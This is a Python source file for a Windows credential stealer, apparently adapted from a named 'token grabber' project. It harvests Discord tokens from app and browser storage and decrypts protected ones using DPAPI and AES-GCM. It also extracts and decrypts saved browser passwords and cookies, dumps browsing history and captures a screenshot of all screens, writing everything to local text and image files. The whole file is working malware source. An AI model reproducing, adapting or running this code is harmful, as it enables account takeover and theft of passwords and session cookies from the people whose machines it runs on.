from re import findall
import os
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from base64 import b64decode
import sqlite3
from shutil import copy2
import json
import base64
from PIL import ImageGrab
import threading

global all_tokens
all_tokens = []
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")

paths = {
    'Discord': local + '\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': local + '\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': local + '\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': local + '\\discordptb\\Local Storage\\leveldb\\',
    'Opera': local + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': local + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': roaming + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': roaming + '\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': roaming + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': roaming + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': roaming + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': roaming + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': roaming + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': roaming + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': roaming + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': roaming + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': roaming + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
    'Uran': roaming + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': roaming + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
}

path2 = roaming + '\\discord\\Local Storage\\leveldb\\'
path3 = roaming + '\\discord\\'

def gettokens(paths):
    tokens = []
    for file_name in os.listdir(paths):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{paths}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    all_tokens.append(token)
    return tokens

def get_master_key(path3):
    with open(f'{path3}Local State', 'r', encoding='utf-8') as f:
        key = loads(f.read())['os_crypt']['encrypted_key']
        return key

penis = get_master_key(path3)

def get_discord_token(path2):
    tokens_discord = []
    for subdir, dirs, files in os.walk(path2):
        for file in files:
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            else:
                try:
                    with open(f"{path2}{file}", "r+", errors='ignore') as f:
                        for i in f.readlines():
                            i.strip()
                            regex2 = '''dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\'''
                            regex3 = r']*"'
                            regex4 = regex2 + regex3
                            for values in findall(regex4, i):
                                tokens_discord.append(values)
                except:
                    pass
    for token in tokens_discord:
        all_tokens.append(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(penis)[5:]))

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        return "An error has occured.\n" + e

#++++++++++++++++++ FULL CREDIT TO SMUG FOR EVERYTHING BELOW THIS https://github.com/Smug246/Luna-Token-Grabber +++++++++++++++++++++++

class browsers():
    def __init__(self) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies, 
                self.history, 
                self.passwords
                ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass
    
    def get_master_key(self, path: str) -> str:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        copy2(path, "Loginvault.db")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        with open('.\\browser-passwords.txt', 'a') as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url and username and password != "":
                    f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(
                        username, password, url))
                else:
                    f.write("No passwords were found :(")
        cursor.close()
        conn.close()
        os.remove("Loginvault.db")

    def cookies(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        copy2(path, "Cookievault.db")
        conn = sqlite3.connect("Cookievault.db")
        cursor = conn.cursor()
        with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
                else:
                    f.write("No cookies were found :(")
        cursor.close()
        conn.close()
        os.remove("Cookievault.db")
    
    def history(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        copy2(path, "Historyvault.db")
        conn = sqlite3.connect("Historyvault.db")
        cursor = conn.cursor()
        with open('.\\browser-history.txt', 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
                
        cursor.close()
        conn.close()
        os.remove("Historyvault.db")

def ss():
    ImageGrab.grab(
        bbox=None,
        include_layered_windows=False,
        all_screens=True,
        xdisplay=None
    ).save("desktop-screenshot.png")

#++++++++++++++++++++++++++++ FULL CREDIT TO SMUG FOR EVERYTHING ABLOVE THIS LINE https://github.com/Smug246/Luna-Token-Grabber ++++++++++++++++++++++++++++

if __name__ == '__main__':
    for platfrom, path in paths.items():
        if not os.path.exists(path):
            continue
        for tokens in gettokens(path):
            print("finished")
    remove_dup = [*set(all_tokens)]
    with open(f"{temp}\\tokens.txt", "w", encoding="utf-8", errors="ignore") as f:
        for shits in remove_dup:
            f.write(shits + "\n")
    threads = [browsers, ss]

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue
